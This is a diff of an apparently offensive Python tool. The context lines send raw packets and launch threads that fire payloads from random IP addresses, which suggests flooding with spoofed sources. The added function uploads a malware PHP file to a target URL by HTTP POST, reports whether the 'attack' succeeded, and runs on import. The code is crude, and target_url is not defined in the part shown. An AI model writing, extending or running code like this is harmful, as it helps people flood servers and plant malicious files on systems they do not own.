@@ -80,6 +80,19 @@ def send_packet():
 
         s.sendto(ip_header, (dest_ip, 0))
 
+def attack_server(malware_path):
+    url = target_url 
+    payload = open(malware_path, 'rb').read()
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}  
+    response = requests.post(url, data=payload, headers=headers)
+    if response.status_code == 200:
+        print("Server successfully attacked!")
+    else:
+        print("Attack failed. Better luck next time!")
+malware_file = "/path/to/malware.php"  
+attack_server(malware_file)
+
+
 user_agents = [
 
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
@@ -762,4 +775,3 @@ if __name__ == "__main__":
     for _ in range(num_threads):
 
         threading.Thread(target=send_payload, args=(generate_random_ip(),)).start()
-
